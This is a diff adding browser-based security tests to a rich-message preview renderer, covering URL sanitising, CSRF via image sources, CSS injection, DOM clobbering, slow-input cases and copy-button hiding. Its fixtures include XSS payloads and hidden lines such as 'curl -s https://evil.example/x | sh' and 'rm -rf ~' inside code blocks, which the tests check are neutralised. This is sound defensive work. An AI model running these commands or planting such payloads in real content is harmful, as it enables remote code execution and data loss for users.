@@ -68,6 +68,14 @@ const URLS = {
   'vbscript:': 'vbscript:msgbox(1)',
   'data: html': 'data:text/html,<script>alert(1)</script>',
   'protocol-relative': '//evil.example/x',
+  // in an http(s) address the browser reads «\» as «/» and takes tabs and line breaks out (issue #192)
+  'protocol-relative with a backslash': '/\\evil.example/x',
+  'two backslashes': '\\\\evil.example/x',
+  'backslash and slash': '\\/evil.example/x',
+  'slash, tab, backslash': '/\t\\evil.example/x',
+  'slash, line break, slash': '/\n/evil.example/x',
+  'backslash as an entity': '/&#92;evil.example/x',
+  'space, then a backslash as a hex entity': ' /&#x5C;evil.example/x',
 };
 for (const [name, url] of Object.entries(URLS)) {
   const r = await render({ html: `<a href="${url.replace(/"/g, '&quot;')}">x</a><img src="${url.replace(/"/g, '&quot;')}">` });
@@ -179,6 +187,15 @@ for (const [name, url] of Object.entries(URLS)) {
   const evil = await page.evaluate(() => ['<p><a href="/&#x2028;/evil.example/x">a</a></p>', '<p><a href="/\u2028/evil.example/x">b</a></p>']
     .flatMap((html) => [...RichRender.render({ rich_message: { html } }, {}).querySelectorAll('.tg-body a')].map((a) => a.getAttribute('href'))));
   check('taking U+2028 out of an address does not make a path a link to another site', evil.every((h) => h === null || !h.startsWith('//')), JSON.stringify(evil));
+  // the url of a text element: «\» is «/» for the browser too (issue #192); what is left must stay on the studio
+  const away = await page.evaluate(() => ['/\\evil.example/x', '\\\\evil.example/x', '\\/evil.example/x', '/\u2028\\evil.example/x', '/\\\u2028evil.example/x']
+    .map((url) => RichRender.render({ rich_message: { blocks: [{ type: 'paragraph', text: { type: 'url', text: 'x', url } }] } }, {}).querySelector('.tg-body a')?.getAttribute('href') ?? null)
+    .filter((h) => h !== null && new URL(h, 'https://studio.example/').host !== 'studio.example'));
+  check('blocks: a url with «\\» for «/» is no link to another site', away.length === 0, JSON.stringify(away));
+  // Telegram keeps U+FEFF in an address (measured, issue #174), at its end too: the preview does not trim it off
+  const feff = await page.evaluate(() => [{ html: '<p><a href="https://example.com/x&#xFEFF;">a</a></p>' }, { blocks: [{ type: 'paragraph', text: { type: 'url', text: 'a', url: 'https://example.com/x\ufeff' } }] }]
+    .map((rm) => RichRender.render({ rich_message: rm }, {}).querySelector('.tg-body a')?.getAttribute('href')));
+  check('U+FEFF at the end of an address stays in it', feff.every((h) => h === 'https://example.com/x\ufeff'), JSON.stringify(feff));
   // the preview cuts html into tags and text for the entities: a «<a» without its «>» costs one look, not the rest
   const took = await page.evaluate(() => {
     const t = performance.now();
@@ -254,11 +271,110 @@ check('safeUrl table', await page.evaluate(() => {
   return s('https://a.b') && s('/media/x.png') && s('#a') && s('tg://user?id=1') && s('tel:+1')
     && s('//evil') === null && s('javascript:x') === null && s('') === null && s(null) === null && s('ftp://a') === null;
 }));
+// the check reads the address as the browser does and trims every space, so nothing in front hides a scheme or a «//»;
+// what it gives back is the address as written (issue #192)
+check('safeUrl: «\\» is «/», tabs and line breaks are out, spaces in front hide nothing', await page.evaluate(() => {
+  const s = RichRender.safeUrl;
+  return ['/\\evil', '\\\\evil', '\\/evil', '/\t\\evil', '/\n/evil', '/\r\n\\evil', ' //evil', '\ufeff//evil', ' /\\evil', '\ufeffjavascript:x', ' javascript:x', ' java\tscript:x']
+    .every((u) => s(u) === null);
+}));
+// a #name the preview resolves itself, so it is read trimmed, as before #192: U+FEFF in front is still the anchor
+check('safeUrl gives an address back as written, a #name trimmed', await page.evaluate(() => {
+  const s = RichRender.safeUrl;
+  return s('https://e.com/x\ufeff') === 'https://e.com/x\ufeff' && s('/media/a\ufeff.png') === '/media/a\ufeff.png' && s('\ufeff#a') === '#a';
+}));
+{
+  // of the studio's own paths the preview loads only its files, /media/: <img src="/api/check?chat_id=@x"> was a GET
+  // with the editor's cookies (issue #201). The path counts as the browser resolves it, on the studio's address too,
+  // so this page stands on one: every request it makes is recorded
+  const studio = await browser.newPage();
+  const asked = [];
+  await studio.route('**/*', (route) => {
+    const u = new URL(route.request().url());
+    asked.push(u.origin === 'https://studio.test' ? u.pathname + u.search : u.href);
+    return route.fulfill(u.href === 'https://studio.test/' ? { contentType: 'text/html', body: '<!doctype html><meta charset="utf-8"><body><div id="out"></div></body>' } : { status: 404, body: '' });
+  });
+  await studio.goto('https://studio.test/');
+  for (const f of ['vendor/markdown-it.min.js', 'render.js']) await studio.addScriptTag({ path: stat(f) });
+  asked.length = 0;
+  const loads = (rm) => studio.evaluate(async (rm) => {
+    const out = /** @type {HTMLElement} */ (document.getElementById('out'));
+    const found = [];
+    for (const opts of [{}, { mediaBase: location.origin }]) { // as the editor and the MCP app draw it, and as /render does
+      out.replaceChildren(RichRender.render({ rich_message: rm }, opts));
+      out.querySelectorAll('[src], [poster]').forEach((n) => ['src', 'poster'].forEach((a) => n.hasAttribute(a) && found.push(a + '=' + n.getAttribute(a))));
+      await new Promise((r) => setTimeout(r, 300));
+    }
+    return found;
+  }, rm);
+  const hostile = [
+    { html: '<img src="/api/check?chat_id=@img"><video src="/api/check?chat_id=@video" poster="/api/check?chat_id=@poster"></video><audio src="/api/check?chat_id=@audio"></audio><video><source src="/api/check?chat_id=@source"></video>' },
+    { markdown: '![](/api/check?chat_id=@md)\n\n<img src="/api/check?chat_id=@mdhtml">' },
+    { html: '<img src="/media/../api/check?chat_id=@dots"><img src="/media/%2e%2e/api/check?chat_id=@pct"><img src="/media\\..\\api\\check?chat_id=@bs"><img src="https://studio.test/api/check?chat_id=@abs"><img src="#x"><img src="/static/tg.css">' },
+    { blocks: [{ type: 'photo', photo: { type: 'photo', media: 'https://studio.test/api/check?chat_id=@block' } }] },
+  ];
+  const kept = [];
+  for (const rm of hostile) kept.push(...await loads(rm));
+  check('preview: of the studio\'s own paths src and poster keep only /media/; nothing else on it is requested', kept.length === 0 && asked.length === 0, JSON.stringify({ kept, asked }));
+  const files = await loads({ html: '<img src="/media/a.png"><video src="/media/v.mp4" poster="/media/p.jpg"></video><img src="https://studio.test/media/b.png"><img src="https://other.example/c.png">' });
+  const upload = await loads({ blocks: [{ type: 'photo', photo: { type: 'photo', media: 'upload:d.png' } }] });
+  check('preview: files from /media/, uploads and other sites still load',
+    JSON.stringify([...files.slice(0, 5), ...upload]) === JSON.stringify(['src=/media/a.png', 'src=/media/v.mp4', 'poster=/media/p.jpg', 'src=https://studio.test/media/b.png', 'src=https://other.example/c.png', 'src=/media/d.png', 'src=https://studio.test/media/d.png'])
+    && asked.includes('/media/a.png') && asked.includes('https://other.example/c.png'), JSON.stringify({ files, upload, asked }));
+  await studio.close();
+}
+{
+  const r = await render({ html: '<p><a href="&#xFEFF;#note">n</a></p><footer><tg-reference name="note">1.</tg-reference></footer>' });
+  check('U+FEFF before #name: still the link to the reference', has(r.html, /<a href="#ref-note" class="tg-reflink">n<\/a>/), r.html);
+}
+{
+  // the scheme of a button is read off the address as the check reads it: a space in front does not take its click
+  const opened = await page.evaluate(() => {
+    const seen = [];
+    const open = window.open;
+    window.open = (u) => { seen.push(u); return null; };
+    const html = '<tg-button-row><tg-button url=" https://example.com/x">b</tg-button><tg-button url=" javascript:window.__xss=1">c</tg-button></tg-button-row>';
+    RichRender.render({ rich_message: { html } }, {}).querySelectorAll('.tg-btn').forEach((b) => b.click());
+    window.open = open;
+    return seen;
+  });
+  check('html: a button with a space before its https address opens it, a javascript: one does not', JSON.stringify(opened) === '["https://example.com/x"]', JSON.stringify(opened));
+}
 
 // ---------- attributes ----------
 {
   const r = await render({ html: '<p style="position:fixed" class="evil" id="x" data-x="1" title="ok">t</p><span class="tg-spoiler">s</span>' });
   check('drops style, id, data-*, foreign classes; keeps title', !has(r.html, /style=|id="x"|data-x|class="evil"/) && has(r.html, /title="ok"/), r.html);
+}
+{
+  // the alignment of a table cell from blocks is a value of text-align, not CSS (issue #201): written into the style
+  // attribute, this cell covered the whole studio page over the shadow root and loaded a picture from evil.example
+  const evil = 'left;position:fixed;inset:0;z-index:2147483647;background:#fff url(https://evil.example/opened.png)';
+  await render({ blocks: [
+    { type: 'table', cells: [[{ text: 'Сохранить', align: evil, valign: 'top;position:fixed;background:url(https://evil.example/v.png)' }, { text: 'b', align: 'right', valign: 'bottom', is_header: true }]] },
+    // no coordinates: no tiles are fetched from openstreetmap.org
+    { type: 'map', location: { latitude: 'north;position:fixed', longitude: 2 }, width: '1;position:fixed', height: '1;background:url(https://evil.example/m.png)' },
+  ] });
+  const got = await page.evaluate(() => ({
+    styles: [...document.querySelectorAll('#out [style]')].map((n) => n.getAttribute('style')),
+    cells: [...document.querySelectorAll('#out td, #out th')].map((c) => [getComputedStyle(c).position, c.style.textAlign, c.style.verticalAlign].join()),
+  }));
+  check('blocks: a table cell\'s align and valign and a map\'s size are no CSS of their own', !got.styles.some((s) => /position|url\(|inset|z-index|background/.test(s))
+    && JSON.stringify(got.cells) === '["static,left,top","static,right,bottom"]', JSON.stringify(got));
+  const outline = await page.evaluate((evil) => RichRender.outline({ rich_message: { blocks: [{ type: 'table', cells: [[{ text: 'a', align: evil }, { text: 'b', align: 'center' }]] }] } }), evil);
+  check('outline: a cell with a bad align reads as left, a good one as written', outline === '<table><tr><td left>a</td><td center>b</td></tr></table>', outline);
+}
+{
+  // a name on <img> is a property of document: <img name="documentElement"> on /render and in the MCP app made
+  // document.documentElement this IMG (issue #201). An anchor is <a name>, and <a> is not one of them
+  await render({ html: '<p><a name="documentElement"></a><a href="#documentElement">к якорю</a></p><img name="documentElement"><img name="title"><img name="body">' });
+  const doc = await page.evaluate(() => ({
+    root: document.documentElement.localName, title: typeof document.title, body: document.body.localName,
+    names: [...document.querySelectorAll('#out [name]')].map((n) => n.localName + ':' + n.getAttribute('name')),
+    link: document.querySelector('#out a[href^="#"]')?.getAttribute('href'),
+  }));
+  check('html: only <a> keeps a name, so a post does not replace document.documentElement; the anchor still works',
+    JSON.stringify(doc) === JSON.stringify({ root: 'html', title: 'string', body: 'body', names: ['a:documentElement'], link: '#anchor-documentElement' }), JSON.stringify(doc));
 }
 {
   const r = await render({ html: '<input type="text" value="x"><ul><li><input type="checkbox" checked> done</li></ul>' });
@@ -297,6 +413,22 @@ const live = (html) => /<(svg|script)\b|<[^>]*\son\w+="|href="javascript/i.test(
 for (const [name, src] of Object.entries(EXTENSIONS)) {
   const r = await render({ markdown: src });
   check('markdown: ' + name, !r.xss && !live(r.html), r.html);
+}
+{
+  // a footnote, a formula over lines and a table row were each looked for from every start to the end (issue #192):
+  // 2 s, 6 s and 7 s for 100 000 bytes; markdown-it by itself reads them in tens of milliseconds
+  const slow = await page.evaluate((hostile) => Object.entries(hostile).map(([name, markdown]) => {
+    const t = performance.now();
+    RichRender.render({ rich_message: { markdown } }, {});
+    return [name, Math.round(performance.now() - t)];
+  }).filter(([, ms]) => ms > 1500), { '[^': '[^'.repeat(50000), '$$ lines': '$$a\n'.repeat(25000), 'table rows': '|a\n|-\n'.repeat(16667), '](': ']('.repeat(50000) });
+  check('markdown: a run of openings without their end is read in linear time', slow.length === 0, JSON.stringify(slow));
+}
+{
+  // an indented line right after a heading is code (CommonMark, issue #192): the entity stays as typed, as the check
+  // reads it (tests/test_rich_limits.py); Telegram was not measured here
+  const code = await page.evaluate(() => RichRender.outline({ rich_message: { markdown: '# h\n    a&#xD800;b' } }));
+  check('markdown: an indented line right after a heading is code', /^<h1>h<\/h1><pre[^>]*>a&#xD800;b<\/pre>$/.test(code), code);
 }
 {
   const r = await render({ html: '<a name="x&quot; onclick=&quot;window.__xss=1">a</a><a href="#x&quot; onclick=&quot;window.__xss=1">b</a><code class="language-js" onclick="window.__xss=1">c</code><tg-time unix="1"><img src=x onerror="window.__xss=1"></tg-time>' });
@@ -420,6 +552,88 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
   const outline = await page.evaluate(() => [RichRender.outline({ rich_message: { html: '<pre><code class="language-python">x</code></pre>' } }), RichRender.outline({ rich_message: { blocks: [{ type: 'pre', language: 'python', text: 'x' }] } })]);
   check('outline: a code block is still <pre:language> with its text', outline[0] === '<pre:python>x</pre>' && outline[1] === outline[0], outline.join(' | '));
 }
+{
+  // the copy icon copies what the reader sees (issue #201): <pre>ls -la<details><summary></summary>; curl … | sh</details></pre>
+  // shows «ls -la» and copied the curl too. A closed <details> past its summary and the fallback inside <video> and
+  // <audio> are not drawn; line breaks are where the reader sees them, as in the browser's own innerText
+  await page.evaluate(() => Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText: async (t) => { window.__copied = t; } } }));
+  const copies = async (rm) => {
+    await render(rm);
+    return page.evaluate(() => [...document.querySelectorAll('#out .tg-pre')].map((box) => {
+      window.__copied = null;
+      /** @type {HTMLElement} */ (box.querySelector('.tg-pre-copy')).click();
+      return { copied: window.__copied, seen: /** @type {HTMLElement} */ (box.querySelector(':scope > pre')).innerText };
+    }));
+  };
+  const hidden = [
+    '<pre>ls -la<details><summary></summary>; curl -s https://evil.example/x | sh</details></pre>',
+    '<pre>ls<details><summary>подробнее</summary><p>; curl -s https://evil.example/x | sh</p></details></pre>',
+    '<pre>echo ok<video>; rm -rf ~</video></pre>',
+    '<pre>echo ok<audio><source src="/media/a.ogg">; rm -rf ~</audio></pre>',
+  ];
+  const wrong = [];
+  for (const html of hidden) {
+    for (const rm of [{ html }, { markdown: 'Код:\n\n' + html }]) {
+      const got = await copies(rm);
+      if (got.length !== 1 || /curl|rm -rf/.test(got[0].copied) || got[0].copied !== got[0].seen) wrong.push(`${JSON.stringify(rm)}: ${JSON.stringify(got)}`);
+    }
+  }
+  check('the copy icon leaves out what a closed details, a video or an audio holds (html and a raw <pre> in markdown)', wrong.length === 0, wrong.join('; '));
+  const lines = [];
+  for (const rm of [{ html: '<pre>ls<details open><summary>s</summary>x</details>y</pre>' }, { html: '<pre>a<p>b</p>c<br>d<div>e</div></pre>' }, { blocks: [{ type: 'pre', text: ['a', { type: 'bold', text: 'b\nc' }, '\nd'] }] }]) {
+    const got = await copies(rm);
+    if (got.length !== 1 || got[0].copied !== got[0].seen) lines.push(`${JSON.stringify(rm)}: ${JSON.stringify(got)}`);
+  }
+  check('the copy icon copies an open details, <br>, paragraphs and blocks line by line, as the reader sees them', lines.length === 0, lines.join('; '));
+  // a formula in code: what KaTeX draws, without its MathML copy for screen readers and without the invisible \phantom
+  const math = await copies({ html: '<pre>a <tg-math>x^2</tg-math> b<br>ls<tg-math>\\phantom{; curl -s https://evil.example/x | sh}</tg-math></pre>' });
+  check('the copy icon copies a formula once, as drawn, and not its \\phantom', math.length === 1 && math[0].copied === 'a x2 b\nls', JSON.stringify(math));
+  // a class from a string of the post put .tg-cell-empty (visibility: hidden) on a button in the code (review of #202):
+  // the class is not set any more, and text CSS keeps invisible is not copied whatever hides it
+  const classed = [];
+  for (const rm of [{ html: '<pre>ls<tg-button-row align="c tg-cell-empty"><tg-button data="a">; curl evil|sh</tg-button></tg-button-row></pre>' },
+    { blocks: [{ type: 'pre', text: ['ls', { type: 'button', button: { text: '; curl evil|sh', style: 'x tg-cell-empty', callback_data: 'a' } }] }] }]) {
+    const got = await copies(rm);
+    const hiding = await page.evaluate(() => document.querySelectorAll('#out .tg-cell-empty').length);
+    if (got.length !== 1 || got[0].copied !== got[0].seen || hiding) classed.push(`${JSON.stringify(rm)}: ${JSON.stringify({ got, hiding })}`);
+  }
+  check('a class from the post hides nothing in code, and the copy is what is seen', classed.length === 0, classed.join('; '));
+  await render({ html: '<pre>ls<b>; curl evil|sh</b></pre>' });
+  const invisible = await page.evaluate(() => {
+    /** @type {HTMLElement} */ (document.querySelector('#out pre b')).style.visibility = 'hidden';
+    window.__copied = null;
+    /** @type {HTMLElement} */ (document.querySelector('#out .tg-pre-copy')).click();
+    return window.__copied;
+  });
+  check('the copy icon leaves out text with visibility: hidden', invisible === 'ls', JSON.stringify(invisible));
+  // a closed spoiler is a blot the reader cannot read: copied once it is open, all of it, nested formatting too
+  await render({ html: '<pre>ls<tg-spoiler>; curl <b>evil</b>|sh</tg-spoiler></pre>' });
+  const spoiler = await page.evaluate(() => {
+    const copy = () => { window.__copied = null; /** @type {HTMLElement} */ (document.querySelector('#out .tg-pre-copy')).click(); return window.__copied; };
+    const closed = copy();
+    /** @type {HTMLElement} */ (document.querySelector('#out .tg-spoiler')).click();
+    return [closed, copy()];
+  });
+  check('the copy icon leaves out a closed spoiler and copies an open one whole', JSON.stringify(spoiler) === JSON.stringify(['ls', 'ls; curl evil|sh']), JSON.stringify(spoiler));
+}
+{
+  // a class name made of a string of the post is one word, else there is none (review of #202): «x tg-cell-empty» put
+  // the hiding class of tg.css on a button or a row of buttons
+  const classes = async (rm, extra) => {
+    await render(rm, extra);
+    return page.evaluate(() => [...document.querySelectorAll('#out .tg-btn-row, #out .tg-btn')].map((n) => n.className));
+  };
+  const blocks = await classes({ blocks: [{ type: 'buttons', align: 'c tg-cell-empty', buttons: [{ text: 'a', style: 'x tg-cell-empty', callback_data: 'a' }, { text: 'b', style: 'primary', callback_data: 'b' }] }, { type: 'buttons', align: 'right', buttons: [] }] },
+    { reply_markup: { inline_keyboard: [[{ text: 'k', style: 'danger tg-spoiler', callback_data: 'k' }]] } });
+  const html = await classes({ html: '<tg-button-row align="c tg-cell-empty"><tg-button data="a">a</tg-button></tg-button-row><tg-button-row align="left"><tg-button data="b">b</tg-button></tg-button-row>' });
+  check('blocks and html: align and style of buttons are a class only as one word',
+    JSON.stringify(blocks) === JSON.stringify(['tg-btn-row tg-align-center', 'tg-btn', 'tg-btn tg-btn-primary', 'tg-btn-row tg-align-right', 'tg-btn'])
+    && JSON.stringify(html) === JSON.stringify(['tg-btn-row tg-align-center', 'tg-btn', 'tg-btn-row tg-align-left', 'tg-btn']), JSON.stringify({ blocks, html }));
+  // upload:.. was /media/.., the page itself; a name is one file in the media folder
+  const srcs = await page.evaluate(() => ['upload:..', 'upload:.', 'upload:', 'upload:../api/check', 'upload:a/b.png', 'upload:a\\b.png', 'upload:a..b.png', 'upload:a.png']
+    .map((m) => RichRender.mediaSrc(m, {})));
+  check('upload: a name that is not one file has no preview', JSON.stringify(srcs) === JSON.stringify([null, null, null, null, null, null, '/media/a..b.png', '/media/a.png']), JSON.stringify(srcs));
+}
 
 // ---------- animation (GIF) ----------
 {
@@ -455,6 +669,77 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
   await render({ blocks: [{ type: 'slideshow', blocks: [photo('a.png')] }] });
   const one = await page.evaluate(() => { const t = document.querySelector('#out .tg-slides'); return [t.hasAttribute('tabindex'), t.hasAttribute('aria-label')]; });
   check('slideshow of one slide is not focusable and has no arrows hint', !one[0] && !one[1], one.join());
+}
+
+// ---------- slow paths (issue #198) ----------
+// Not by a fixed limit, which a slow CI runner may miss: by how much the time grows with the input (as
+// tests/test_rich_limits.py::test_deep_html_is_checked_in_linear_time) or against the same post drawn a plain way
+{
+  /** the least of two runs, ms: drawing the post (render), its outline, or laying it out on the page once drawn (layout) */
+  const took = (what, rm) => page.evaluate(([what, rm]) => {
+    const out = /** @type {HTMLElement} */ (document.getElementById('out'));
+    const once = () => {
+      out.replaceChildren();
+      out.getBoundingClientRect();
+      const drawn = what === 'layout' ? RichRender.render({ rich_message: rm }, {}) : null;
+      const t = performance.now();
+      if (drawn) { out.append(drawn); out.getBoundingClientRect(); }
+      else if (what === 'outline') RichRender.outline({ rich_message: rm });
+      else RichRender.render({ rich_message: rm }, {});
+      return performance.now() - t;
+    };
+    const least = Math.min(once(), once());
+    out.replaceChildren();
+    return least;
+  }, [what, rm]);
+  const ms = (small, big) => `${small.toFixed(0)} ms → ${big.toFixed(0)} ms`;
+  // four times the input takes about four times as long when linear and sixteen when quadratic, on any machine
+  const linear = async (name, what, make, n) => {
+    const small = await took(what, make(n)), big = await took(what, make(4 * n));
+    check(`${name}, four times the input in about four times as long: ${ms(small, big)}`, big < 8 * small + 100);
+  };
+  // the post drawn a plain way: what the browser itself takes for the same input
+  const asPlain = async (name, what, rm, plain, times = 4) => {
+    const base = await took(what, plain), t = await took(what, rm);
+    check(`${name}, about as long as the same post drawn plainly: ${ms(base, t)}`, t < times * base + 100);
+  };
+
+  // a formula inside a formula: walked first, it gave the outer one the text of the inner one as KaTeX drew it, three
+  // times longer on every level (12 levels: 52 s). A formula is its TeX, a tag in it is not drawn: what Telegram makes
+  // of it is not measured (html-math-nested in tests/telegram_parse/cases.json), so the preview draws the plainest thing
+  const formulas = (rm) => page.evaluate((rm) => [...RichRender.render({ rich_message: rm }, {}).querySelectorAll('.tg-math, .tg-math-block')]
+    .map((n) => [n.className, n.querySelectorAll('.katex').length, n.querySelector('annotation')?.textContent ?? n.textContent]), rm);
+  const nested = '<tg-math>a<tg-math>b<tg-math>c</tg-math></tg-math>d</tg-math>';
+  const html = await formulas({ html: `<p>${nested}</p><tg-math-block>x+<tg-math>y</tg-math></tg-math-block>` });
+  const md = await formulas({ markdown: `Формула ${nested} и $e$` });
+  const ok = JSON.stringify(html) === JSON.stringify([['tg-math', 1, 'abcd'], ['tg-math-block', 1, 'x+y']])
+    && JSON.stringify(md) === JSON.stringify([['tg-math', 1, 'abcd'], ['tg-math', 1, 'e']]);
+  check('html and markdown: a formula in a formula is one formula of their TeX', ok, JSON.stringify({ html, md }).slice(0, 400));
+  // only once the formula is one: otherwise 12 levels hang the page for a minute
+  if (ok) {
+    await linear('html: formulas in formulas', 'render', (n) => ({ html: '<tg-math>'.repeat(n) + 'x' }), 100);
+    await linear('markdown: formulas in formulas', 'render', (n) => ({ markdown: '<tg-math-block>'.repeat(n) + 'x' }), 100);
+  } else check('formulas in formulas in linear time', false, 'not run: a formula in a formula is drawn by itself');
+
+  // from every $ a closing one was looked for up to the end of the paragraph: 34 KB of «$1» took 2.7 s on every redraw
+  await linear('markdown: a run of $ without a closing one', 'render', (n) => ({ markdown: '$1'.repeat(n) }), 4250);
+  await linear('markdown: a run of $ after an unclosed one', 'render', (n) => ({ markdown: '$a' + ' $1'.repeat(n) }), 3000);
+  // a code block in a code block is its code, not a box of its own: each moved what was under it into its box (980 ms)
+  await asPlain('html: code blocks in code blocks', 'render', { html: '<pre>'.repeat(6000) + 'x' }, { html: '<b>'.repeat(6000) + 'x' });
+  const inner = await page.evaluate(() => {
+    const body = /** @type {Element} */ (RichRender.render({ rich_message: { html: '<pre><code class="language-js">a<pre>b</pre></code></pre>' } }, {}).querySelector('.tg-body'));
+    return [body.querySelectorAll('.tg-pre').length, body.querySelectorAll('pre').length, RichRender.outline({ rich_message: { html: '<pre>a<pre>b</pre></pre>' } })];
+  });
+  check('html: a code block in a code block has no header of its own', JSON.stringify(inner) === JSON.stringify([1, 2, '<pre>a<pre>b</pre></pre>']), JSON.stringify(inner));
+  // a TON address was looked for with closest() from every piece of text, up through all the tags above it
+  await asPlain('html: TON addresses in text deep in tags', 'render', { html: '<span>'.repeat(511) + 'a<br>'.repeat(30000) },
+    { html: '<span>'.repeat(511) + 'a<br>'.repeat(30000), skip_entity_detection: true }, 2);
+  // the number of an item was its place found with indexOf in the whole list, for every item
+  await linear('outline: a long numbered list', 'outline', (n) => ({ html: '<ol>' + '<li>a</li>'.repeat(n) + '</ol>' }), 1625);
+  // an unknown tag in an unknown tag: every level drew its own dashed frame round each of the 7000 lines (2.3 s of
+  // layout), and a closed spoiler in a closed spoiler its own blot under the outer one
+  await asPlain('html: unknown tags in unknown tags over many lines', 'layout', { html: '<tg-x>'.repeat(512) + '<br>'.repeat(7000) }, { html: '<b>'.repeat(512) + '<br>'.repeat(7000) });
+  await asPlain('html: spoilers in spoilers over many lines', 'layout', { html: '<tg-spoiler>'.repeat(512) + '<br>'.repeat(7000) }, { html: '<b>'.repeat(512) + '<br>'.repeat(7000) });
 }
 
 check('no script ran and no page errors', (await page.evaluate(() => window.__xss)) === 0 && pageErrors.length === 0, pageErrors.join(' | '));
